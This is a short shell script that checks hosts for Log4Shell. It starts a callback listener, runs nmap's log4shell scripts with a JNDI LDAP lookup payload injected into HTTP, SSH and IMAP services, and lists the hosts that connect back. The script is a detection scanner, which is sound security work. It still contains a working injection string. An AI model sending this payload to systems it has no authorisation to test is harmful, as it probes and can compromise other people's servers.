echo "Starting server"

tcpserver -v 0.0.0.0 1234 sh -c "echo 'Vulnerable machine'" 2> vulnerable.txt &

echo "Scanning hosts..."

nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://172.17.0.1:1234}"' -T4 -n -p$2 -sV --script-timeout=1m $1

echo "\n"
echo "\n"
echo "List of vulnerable hosts"
echo "========================"
cat vulnerable.txt | grep -a from | grep -Po '[0-9.]{7,15}'
